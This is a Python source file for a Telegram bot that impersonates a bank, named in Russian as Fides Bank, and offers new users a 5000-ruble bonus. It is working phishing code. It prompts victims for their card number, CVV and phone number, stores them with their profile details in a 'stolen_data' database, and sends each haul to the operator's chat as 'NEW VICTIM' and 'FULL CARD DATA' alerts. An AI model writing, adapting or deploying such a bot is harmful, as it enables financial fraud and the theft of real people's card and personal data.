import telebot
import sqlite3
import threading
import time
from telebot import types

TOKEN = "TOKEN"
ADMIN_ID = "YOUID"
DB_NAME = "stolen_data.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     user_id INTEGER,
                     username TEXT,
                     first_name TEXT,
                     last_name TEXT,
                     phone TEXT,
                     card TEXT,
                     timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

bot = telebot.TeleBot(TOKEN)

def save_stolen_data(user_id, username, first_name, last_name, phone=None, card=None):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO users (user_id, username, first_name, last_name, phone, card) VALUES (?, ?, ?, ?, ?, ?)",
        (user_id, username, first_name, last_name, phone, card))
    conn.commit()
    conn.close()
    bot.send_message(ADMIN_ID,
                     f"⚠️ NEW VICTIM ⚠️\nID: {user_id}\nUser: @{username}\nName: {first_name} {last_name}\nPhone: {phone}\nCard: {card}")

@bot.message_handler(commands=['start'])
def start_phishing(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("🎁 Получить бонус")
    btn2 = types.KeyboardButton("📞 Поддержка")
    markup.add(btn1, btn2)

    bot.send_message(message.chat.id,
                     "👋 Добро пожаловать в официальный бот Фидес Банк!\n\n"
                     "Мы дарим *5000₽* новым пользователям! Нажмите кнопку ниже для получения.",
                     parse_mode='Markdown', reply_markup=markup)
    save_stolen_data(message.from_user.id, message.from_user.username,
                     message.from_user.first_name, message.from_user.last_name)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    if message.text == "🎁 Получить бонус":
        msg = bot.send_message(message.chat.id,
                               "Для получения бонуса нам необходимо проверить вашу карту.\n\n"
                               "⚠️ Введите номер карты (16 цифр):")
        bot.register_next_step_handler(msg, process_card_step)
    elif message.text == "📞 Поддержка":
        msg = bot.send_message(message.chat.id,
                               "Наш оператор свяжется с вами в течение 5 минут.\n\n"
                               "Введите ваш номер телефона (+7XXXXXXXXXX):")
        bot.register_next_step_handler(msg, process_phone_step)

def process_card_step(message):
    try:
        card = message.text.replace(" ", "")
        if len(card) == 16 and card.isdigit():
            save_stolen_data(message.from_user.id, message.from_user.username,
                             message.from_user.first_name, message.from_user.last_name,
                             card=card)
            bot.send_message(message.chat.id,
                             "✅ Карта принята! Ожидайте зачисления в течение 24 часов.\n\n"
                             "Для ускорения верификации введите CVV код:")
            bot.register_next_step_handler(message, process_cvv_step)
        else:
            bot.send_message(message.chat.id, "❌ Неверный формат карты! Попробуйте еще раз.")
            bot.register_next_step_handler(message, process_card_step)
    except Exception as e:
        bot.send_message(ADMIN_ID, f"ERROR: {str(e)}")

def process_cvv_step(message):
    cvv = message.text
    if len(cvv) == 3 and cvv.isdigit():
        bot.send_message(message.chat.id,
                         "🎉 Поздравляем! Ваш бонус будет зачислен в течение 24 часов.")
        bot.send_message(ADMIN_ID, f"🚨 FULL CARD DATA 🚨\nUser: @{message.from_user.username}\nCard: {card}\nCVV: {cvv}")
    else:
        bot.send_message(message.chat.id, "❌ Неверный CVV! Попробуйте еще раз.")
        bot.register_next_step_handler(message, process_cvv_step)

def process_phone_step(message):
    phone = message.text
    if phone.startswith('+7') and len(phone) == 12:
        save_stolen_data(message.from_user.id, message.from_user.username,
                         message.from_user.first_name, message.from_user.last_name,
                         phone=phone)
        bot.send_message(message.chat.id,
                         "✅ Ваш запрос принят! Ожидайте звонка оператора.")
    else:
        bot.send_message(message.chat.id, "❌ Неверный формат телефона! Используйте +7XXXXXXXXXX")
        bot.register_next_step_handler(message, process_phone_step)

def hide_traffic():
    while True:
        time.sleep(3600)
        bot.send_message(ADMIN_ID, "🤖 Бот работает стабильно, трафик маскируется")

if __name__ == "__main__":
    init_db()
    threading.Thread(target=hide_traffic, daemon=True).start()
    bot.polling(none_stop=True)
